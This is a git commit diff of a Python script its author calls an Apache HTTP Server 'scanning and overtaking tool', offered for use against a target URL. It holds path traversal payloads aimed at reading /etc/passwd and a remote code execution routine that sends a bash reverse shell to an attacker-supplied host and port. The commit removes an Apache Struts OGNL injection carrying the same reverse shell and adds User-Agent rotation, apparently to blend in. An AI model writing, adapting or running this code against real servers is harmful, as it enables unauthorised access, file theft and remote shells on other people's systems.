cd97faa562a6477eec54701b89c4a96f62f3f09d
Y Q N O <79216939+Yqno@users.noreply.github.com>
2025-01-06 12:06:03 +0100

    Update ApacheScanner.py

--- ApacheScanner.py
+++ ApacheScanner.py
@@ -1,10 +1,7 @@
 import argparse
 import requests
-import struct
-import socket
+import random
 import sys
-import urllib3
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 def header():
     print('''
@@ -13,7 +10,7 @@ def header():
 ▐▛▀▜▐▛▀▘▐▛▀▜▐▌  ▐▛▀▜▐▛▀▀▘     ▝▀▚▐▌  ▐▛▀▜▐▌ ▝▜▐▌ ▝▜▐▛▀▀▐▛▀▚▖
 ▐▌ ▐▐▌  ▐▌ ▐▝▚▄▄▐▌ ▐▐▙▄▄▖    ▗▄▄▞▝▚▄▄▐▌ ▐▐▌  ▐▐▌  ▐▐▙▄▄▐▌ ▐▌
                         https://github.com/Yqno
-                                                            ''')
+                                                ''')
 
 def print_custom_help():
     print('''\
@@ -23,7 +20,7 @@ Apache HTTP Server scanning and overtaking tool written by Yqno.
 
 Options:
   -h, --help            Show this help message and exit
-  -u URL, --url URL     The target URL of your Apache HTTP Server (default is http://localhost:8080)
+  -u URL, --url URL     The target URL of your Apache HTTP Server (e.g., example.com)
   -t TIMEOUT, --timeout TIMEOUT
                         The timeout of the request in seconds (default is 25)
   -p PORT, --port PORT  The port number of your Apache HTTP Server (default port is 80)
@@ -31,33 +28,34 @@ Options:
                         The command to be executed on your Apache HTTP Server (default is ls -l)
   --rce                 Enable remote code execution on your Apache HTTP Server (default is False)
   --cmd CMD             Command to run if RCE is enabled (default is whoami)
-  --lhost LHOST         Attacker IP for reverse shell (optional unless --rce is enabled)
-  --lport LPORT         Attacker listening port for reverse shell (optional unless --rce is enabled)
+  --lhost LHOST         Attacker IP for reverse shell (required if --rce is enabled)
+  --lport LPORT         Attacker listening port for reverse shell (required if --rce is enabled)
 ''')
 
 def main():
     parser = argparse.ArgumentParser(description='Apache HTTP Server overtaking tool written by Yqno.')
 
-    parser.add_argument('-u', '--url', type=str, help='The target URL of your Apache HTTP Server (default is localhost)', default='http://localhost:8080')
+    parser.add_argument('-u', '--url', type=str, help='The target URL of your Apache HTTP Server (e.g., example.com)', required=True)
     parser.add_argument('-t', '--timeout', type=int, help='The timeout of the request in seconds (default is 25)', default=25)
     parser.add_argument('-p', '--port', type=int, help='The port number of your Apache HTTP Server (default port is 80)', default=80)
     parser.add_argument('-c', '--command', type=str, help='The command to be executed on your Apache HTTP Server (default is ls -l)', default='ls -l')
     parser.add_argument('--rce', action='store_true', help='Enable remote code execution on your Apache HTTP Server (default is False)', default=False)
     parser.add_argument('--cmd', type=str, help='Command to run if RCE is enabled (default is whoami)', default="whoami")
-    parser.add_argument('--lhost', type=str, help='Attacker IP for reverse shell (optional unless --rce is enabled)', default=None)
-    parser.add_argument('--lport', type=int, help='Attacker listening port for reverse shell (optional unless --rce is enabled)', default=None)
+    parser.add_argument('--lhost', type=str, help='Attacker IP for reverse shell (required if --rce is enabled)', required=False)
+    parser.add_argument('--lport', type=int, help='Attacker listening port for reverse shell (required if --rce is enabled)', required=False)
 
-    args = parser.parse_args()
+    args =parser.parse_args()
 
     # Check if the user requested help
     if '--help' in sys.argv or '-h' in sys.argv:
         print_custom_help()
         sys.exit()
 
-    # Validate RCE-related arguments
-    if args.rce and (not args.lhost or not args.lport):
-        print("[!] --lhost and --lport are required when --rce is enabled.")
-        sys.exit()
+    # Validate RCE arguments
+    if args.rce:
+        if not args.lhost or not args.lport:
+            print("[!] --lhost and --lport are required when --rce is enabled.")
+            sys.exit(1)
 
     # Proceed with the rest of the script
     exploiter = Exploiter(args.url, args.timeout, args.port, args.command, args.rce, args.cmd, args.lhost, args.lport)
@@ -65,7 +63,7 @@ def main():
 
 class Exploiter:
     def __init__(self, url, timeout, port, command, rce, cmd, lhost, lport):
-        self.url = url
+        self.url = self.normalize_url(url)
         self.timeout = timeout
         self.port = port
         self.command = command
@@ -74,17 +72,30 @@ class Exploiter:
         self.lhost = lhost
         self.lport = lport
 
+        # List of User-Agents
+        user_agents = [
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36',
+            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36',
+            'Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Safari/604.1',
+            'Mozilla/5.0 (Linux; Android 9; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Mobile Safari/537.36',
+            'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0',
+            'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; Nexus 7 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30',
+            'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
+        ]
+
+
+        # Randomly choose a User-Agent for each request
         self.headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36',
+            'User-Agent': random.choice(user_agents),
             'Accept-Language': 'en-US,en;q=0.9',
             'Accept-Encoding': 'gzip, deflate',
         }
 
-    # Path Traversal Check
-    def check_pathtraversal(self):
-        print(f"[*] Checking for path traversal vulnerabilities on {self.url}")
 
-        payloads = [
+        self.path_traversal_payloads = [
             "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
             "/../../../../../../etc/passwd",
             "/..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
@@ -97,36 +108,17 @@ class Exploiter:
             "/..;/..;/..;/..;/etc/passwd"
         ]
 
-        for payload in payloads:
-            target = f"{self.url}{payload}"
-            try:
-                response = requests.get(target, headers=self.headers, timeout=self.timeout, verify=False)
-                if "root:x:" in response.text or "Administrator" in response.text:
-                    print(f"[+] Path traversal vulnerability found with payload: {payload}")
-                else:
-                    print(f"[-] Payload not vulnerable: {payload}")
-            except Exception as e:
-                print(f"[!] Error with payload {payload}: {e}")
 
 
-    # Apache Struts RCE Check
-    def check_apache_struts_rce(self):
-        print(f"[*] Checking for Apache Struts RCE vulnerability on {self.url}")
-        payload = f"bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"
-        headers = {
-            'Content-Type': f'{self.url}?${{(#_memberAccess[\'allowStaticMethodAccess\']=true)(#a=@java.lang.Runtime@getRuntime().exec(\'{payload}\'))}}'
-        }
 
-        try:
-            response = requests.get(self.url, headers=headers, timeout=self.timeout)
-            if response.status_code == 200:
-                print("[+] Apache Struts RCE vulnerability found! RCE triggered.")
-            else:
-                print("[-] No Apache Struts RCE vulnerability detected.")
-        except Exception as e:
-            print(f"[!] Error: {e}")
+    # Normalize URL to add https:// if not present
+    def normalize_url(self, url):
+        if not url.startswith("http://") and not url.startswith("https://"):
+            print(f"[*] No protocol provided for URL '{url}', defaulting to 'https://'.")
+            url = f"https://{url}"
+        return url.rstrip('/')
 
-    # DoS Attack Check
+
     def check_dosattack(self):
         print(f"[*] Checking for DoS vulnerability on {self.url}")
         try:
@@ -148,18 +140,65 @@ class Exploiter:
         except Exception as e:
             print(f"[!] Error: {e}")
         finally:
-            s.close()
+            s.close()   
+    
+    
+    
+    # Check if the website is running Apache HTTP
+    def check_apache(self):
+        print(f"[*] Checking if {self.url} is running Apache HTTP server...")
+        try:
+            response = requests.head(self.url, headers=self.headers, timeout=self.timeout)
+            server_header = response.headers.get('Server', '').lower()
+            if 'apache' in server_header:
+                print("[+] Apache HTTP server detected!")
+                return True
+            else:
+                print("[-] Apache HTTP server not detected.")
+                return False
+        except requests.RequestException as e:
+            print(f"[!] Error while checking server type: {e}")
+            return False
 
-
-
+    # Run all checks
     def run_checks(self):
+        if not self.check_apache():
+            print("[!] Exiting. The target is not running Apache HTTP server.")
+            return
+        print("[*] Proceeding with vulnerability checks...")
         self.check_pathtraversal()
         if self.rce:
             self.check_rce()
-            self.check_apache_struts_rce()
-        self.check_dosattack()
+
+    def check_pathtraversal(self):
+        print(f"[*] Checking for path traversal vulnerabilities on {self.url}")
+        for payload in self.path_traversal_payloads:
+            target = f"{self.url}{payload}"
+            try:
+                response = requests.get(target, headers=self.headers, timeout=self.timeout)
+                if "root:x:" in response.text or "boot.ini" in response.text:
+                    print(f"[+] Path traversal vulnerability found! Payload: {payload}")
+                else:
+                    print(f"[-] No path traversal vulnerability detected with payload: {payload}")
+            except Exception as e:
+                print(f"[!] Error with payload {payload}: {e}")
 
 
-if __name__ == '__main__':
+    def check_rce(self):
+        print(f"[*] Checking for remote code execution vulnerability on {self.url}")
+        target = f"{self.url}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
+        payload = f"bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"
+        data = {"echo": payload}
+
+        try:
+            response = requests.post(target, data=data, headers=self.headers, timeout=self.timeout)
+            if response.status_code == 200:
+                print("[+] Remote code execution vulnerability found!")
+            else:
+                print("[-] No remote code execution vulnerability detected.")
+        except Exception as e:
+            print(f"[!] Error: {e}")
+
+if __name__ == "__main__":
     header()
     main()
